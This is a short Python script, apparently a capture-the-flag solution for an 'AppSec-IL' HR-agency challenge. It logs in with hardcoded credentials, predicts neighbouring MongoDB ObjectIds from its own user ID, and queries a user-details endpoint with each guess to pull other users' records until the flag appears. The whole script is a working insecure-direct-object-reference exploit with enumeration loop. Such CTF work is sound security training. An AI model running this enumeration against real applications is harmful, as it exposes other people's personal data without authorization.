from mongo_objectid_predict import predict
import requests

s = requests.Session()
s.post("https://hragency.appsecil.ctf.today/api/login", json = {"email":"paula74@hunter-harris.net", "password":"x!k_856hBM"})

print ("Base User ID: {}".format(s.cookies['user_id']))
print("-" * 30)

for objectid in predict(base = s.cookies["user_id"],
                        backward = True,
                        counter_diff = 100):
    r = s.post("https://hragency.appsecil.ctf.today/api/getUserDetails", json={"user_id": objectid})
    response = r.json()

    if response["isSuccess"]:
        print("User ID: {}".format(objectid))
        print(response)
        print("-" * 30)

    if "AppSec-IL" in r.text:
        print ("Found flag!")
        break